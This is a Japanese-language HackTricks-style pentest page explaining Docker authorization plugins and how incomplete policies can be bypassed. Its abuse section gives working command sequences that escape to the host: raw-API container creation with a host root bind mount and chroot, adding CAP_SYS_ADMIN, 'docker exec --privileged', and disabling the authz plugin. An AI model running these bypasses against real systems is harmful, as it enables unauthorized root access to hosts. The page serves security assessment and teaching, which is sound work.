# ランタイム認可プラグイン

{{#include ../../../banners/hacktricks-training.md}}

## 概要

ランタイム認可プラグインは、呼び出し元が特定のデーモン操作を実行できるかを決定する追加のポリシーレイヤーです。Dockerは典型的な例です。デフォルトでは、Dockerデーモンと通信できる者は事実上広範な制御権を持ちます。認可プラグインは、認証済みユーザーや要求されたAPI操作を調べ、ポリシーに従って要求を許可または拒否することで、そのモデルを制限しようとします。

このトピックは独立したページに値します。攻撃者が既にDocker APIや`docker`グループのユーザーにアクセスできる場合、悪用モデルが変わるからです。そのような環境では問いはもはや単に「デーモンに到達できるか？」だけではなく、「デーモンが認可レイヤーで囲われているか？もし囲われているなら、そのレイヤーは未処理のエンドポイント、脆弱なJSON解析、あるいはプラグイン管理の権限を通じてバイパスできないか？」になります。

## 動作

要求がDockerデーモンに到達すると、認可サブシステムは要求コンテキストを1つ以上のインストール済みプラグインに渡すことができます。プラグインは認証済みユーザーの識別情報、要求の詳細、選択されたヘッダ、およびコンテンツタイプが適切な場合には要求または応答ボディの一部を見ることができます。複数のプラグインをチェーンできますが、すべてのプラグインが要求を許可した場合にのみアクセスが付与されます。

このモデルは堅牢に思えますが、安全性はポリシー作者がAPIをどれだけ完全に理解しているかに完全に依存します。`docker run --privileged` をブロックするプラグインでも `docker exec` を無視したり、トップレベルの `Binds` のような代替JSONキーを見落としたり、プラグインの管理を許可していれば、制限されているという誤った感覚を生み出しつつ、直接的な権限昇格経路を残してしまう可能性があります。

## 一般的なプラグイン対象

ポリシーの見直しで重要な領域は：

- コンテナ作成エンドポイント
- `HostConfig` のフィールド（例：`Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`、および名前空間共有オプション）
- `docker exec` の挙動
- プラグイン管理エンドポイント
- 意図したポリシーモデルの外側で間接的にランタイムアクションを引き起こし得るエンドポイント

歴史的に、Twistlockの `authz` プラグインや `authobot` のような単純な教育用プラグインは、このモデルを研究しやすくしました。なぜならそれらのポリシーファイルやコードパスが、エンドポイントからアクションへのマッピングが実際にどのように実装されているかを示していたからです。評価作業における重要な教訓は、ポリシー作者は最も目に見えるCLIコマンドだけでなく、APIの全表面を理解する必要があるということです。

## 悪用

最初の目標は、実際に何がブロックされているかを把握することです。もしデーモンがアクションを拒否した場合、エラーはしばしばプラグイン名を leak し、その使用中の制御を特定するのに役立ちます：
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
より広範なエンドポイントプロファイリングが必要な場合、`docker_auth_profiler` のようなツールは有用です。これらは、plugin によって実際に許可されている API ルートや JSON 構造を確認するという反復的な作業を自動化します。

環境がカスタム plugin を使用しており、API と対話できる場合は、どのオブジェクトフィールドが実際にフィルタされているかを列挙してください:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
These checks matter because many authorization failures are field-specific rather than concept-specific. A plugin may reject a CLI pattern without fully blocking the equivalent API structure.

### 完全な例: `docker exec` がコンテナ作成後に特権を付与する

特権コンテナの作成をブロックするポリシーでも、制約されていないコンテナの作成と `docker exec` を許可している場合は、依然としてバイパス可能です:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
If the daemon accepts the second step, the user has recovered a privileged interactive process inside a container the policy author believed was constrained.

### Full Example: Bind Mount Through Raw API

一部の不備のあるポリシーは1つの JSON 形状しか検査しません。root filesystem bind mount が一貫してブロックされていない場合、ホストは依然としてマウントされる可能性があります:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
同じ考え方は `HostConfig` の下にも現れることがあります：
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
影響はホストのファイルシステムからの完全なエスケープです。興味深い点は、バイパスがカーネルのバグではなく、ポリシーのカバレッジ不足に起因することです。

### 完全な例: 未チェックの Capability 属性

ポリシーがcapability関連の属性をフィルタリングし忘れると、攻撃者は危険なcapabilityを再獲得するcontainerを作成できる:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
`CAP_SYS_ADMIN`または同等に強力なcapabilityが存在すると、[capabilities.md](protections/capabilities.md)および[privileged-containers.md](privileged-containers.md)で説明されている多くのブレイクアウト手法に到達可能になる。

### 完全な例: プラグインを無効化する

プラグイン管理操作が許可されている場合、最もクリーンなバイパスは制御を完全にオフにすることかもしれない:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
これはコントロールプレーンレベルでのポリシーの失敗です。認可レイヤーは存在しますが、制限対象であるはずのユーザーがそれを無効化する権限を保持したままです。

## チェック

これらのコマンドは、ポリシーレイヤーが存在するかどうか、およびそれが完全なものか表面的なものかを判別することを目的としています。
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
ここで興味深い点:

- plugin名を含む拒否メッセージは認可レイヤーの存在を確認し、しばしば正確な実装を明らかにする。
- 攻撃者から見えるpluginリストだけで、disableやreconfigure操作が可能かどうかを特定するのに十分な場合がある。
- 明らかなCLI操作のみをブロックし、raw API requestsを阻止しないポリシーは、証明されるまでは回避可能と見なすべきである。

## ランタイムのデフォルト

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | デフォルトでは有効になっていない | 認可プラグインが設定されていない限り、daemonへのアクセスは事実上全か無かになる | 不完全なプラグインポリシー、許可リストの代わりにブラックリストを使用、プラグイン管理を許可、フィールドレベルの盲点 |
| Podman | 一般的な直接の同等物ではない | Podmanは通常、Dockerスタイルのauthz pluginsよりもUnix権限、rootless実行、API公開の判断に依存する | root権限のPodman APIを広範囲に公開すること、ソケット権限が弱い |
| containerd / CRI-O | 制御モデルが異なる | これらのランタイムは通常、Dockerのauthz pluginsよりもソケット権限、ノードの信頼境界、および上位レイヤのオーケストレータ制御に依存する | ソケットをワークロードにマウントすること、ノードローカルの信頼仮定が弱い |
| Kubernetes | API-serverやkubeletレイヤーでauthn/authzを使用し、Docker authz pluginsは使わない | Cluster RBACとadmission controlsが主要なポリシーレイヤーである | 過度に広いRBAC、弱いadmissionポリシー、kubeletやruntime APIsを直接公開すること |
{{#include ../../../banners/hacktricks-training.md}}
